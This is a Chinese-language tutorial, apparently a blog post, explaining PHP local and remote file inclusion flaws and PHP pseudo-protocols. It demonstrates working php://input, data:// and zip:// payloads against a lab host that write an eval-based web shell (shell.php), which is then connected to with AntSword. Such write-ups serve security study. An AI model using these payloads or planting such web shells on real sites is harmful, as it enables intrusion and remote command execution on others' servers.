# 文件包含漏洞

## 原理

文件包含漏洞：即file inclusion，意思是文件包含，是指当服务器开启`allow_url_include`选项时，就可以通过PHP的某些特性函数（include()，require()和include_once()，requir_once()）利用URL去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了PHP配置中的allow_url_fopen选项，选项开启之后，服务器允许包含一个远程文件，服务器通过PHP特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到自己的目的。

- 1、文件包含即程序通过包含函数调用本地或远程文件，以此来实现拓展功能
- 2、被包含的文件可以是各种文件格式，而当文件里面包含恶意代码，则会形成远程命令执行或文件上传漏洞。
- 3、文件包含漏洞主要发生在有包含语句的环境中，例如PHP所具备include、require等函数。

## 分类

> 本地文件包含LFI（local file include）当被包含的文件在服务器本地时，就形成本地文件包含  
> 远程文件包含RFI（remote file include）当被包含的文件在第三方服务器时，叫做远程文件包含。

## PHP文件包含的函数

> include( )  
> 当使用该函数包含文件时，只有代码执行到 include()函数时才将文件包含  
> 进来，发生错误时之给出一个警告，继续向下执行。
> 
> include_once( )  
> 功能与 Include()相同，区别在于当重复调用同一文件时，程序只调用一次
> 
> require( )require()与 include()的区别在于 require()执行如果发生错误，函数会输出  
> 错误信息，并终止脚本的运行。
> 
> require_once( )  
> 功能与 require()相同，区别在于当重复调用同一文件时，程序只调用一次

远程文件包含漏洞

> 当包含的文件在远程服务器上时，就形成了远程文件包含  
> 远程文件包含的注意点：  
> 1). 需要php.ini中allow_url_include = on以及allow_url_fopen=on  
> 2). 所包含远程服务器的文件后缀不能与目标服务器语言相同。(比如目标服务器是php脚本语言解析的，  
> 那么包含的远程服务器文件后缀不能是php)

## 伪协议

> data:text/plain 或 data:text/plain;base64  
> php://input  
> php://filter  
> file://  
> zip://

**payload**

```php
data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=;
include('php://input’);include('php://filter/read=convert.base64-encode/resource=test.php');//用于读取源码
zip://2.zip%232.php
```

## 演示

本演示为通过伪协议获取webshell  
测试的PHP文件  
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020082018335259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjc5MzU4,size_16,color_FFFFFF,t_70#pic_center)

### php://input 伪协议

使用burpsuite抓包再改包  
Payload: `http://192.168.232.128/file.php?a=php://input`  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200820183446410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjc5MzU4,size_16,color_FFFFFF,t_70#pic_center)

更改请求方式为post  
post过去的代码为

```php
<?PHP fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd]);?>');?>
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200820183454503.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjc5MzU4,size_16,color_FFFFFF,t_70#pic_center)

再发包即可生成一个shell.php文件，然后使用蚁剑连接  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200820183500566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjc5MzU4,size_16,color_FFFFFF,t_70#pic_center)

### data://text/plain 伪协议

将木马使用base64编码

```php
<?PHP fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd]);?>');?>
```

编码之后

> PD9QSFAgZnB1dHMoZm9wZW4oJ3NoZWxsLnBocCcsJ3cnKSwnPD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4nKTs/Pg==

Payload:

```php
http://192.168.232.128/file.php?a=data://text/plain;base64,PD9QSFAgZnB1dHMoZm9wZW4oJ3NoZWxsLnBocCcsJ3cnKSwnPD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4nKTs/Pg==
```

使用该payload即可在网站根目录下生成shell.php文件，然后蚁剑连接  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200820183727569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjc5MzU4,size_16,color_FFFFFF,t_70#pic_center)

### zip:// 伪协议

创建一个zip压缩包，里面含有带木马的PHP文件

```php
Payload：http://192.168.232.128/file.php?a=zip://2.zip%232.php
```

其余步骤与data伪协议一样
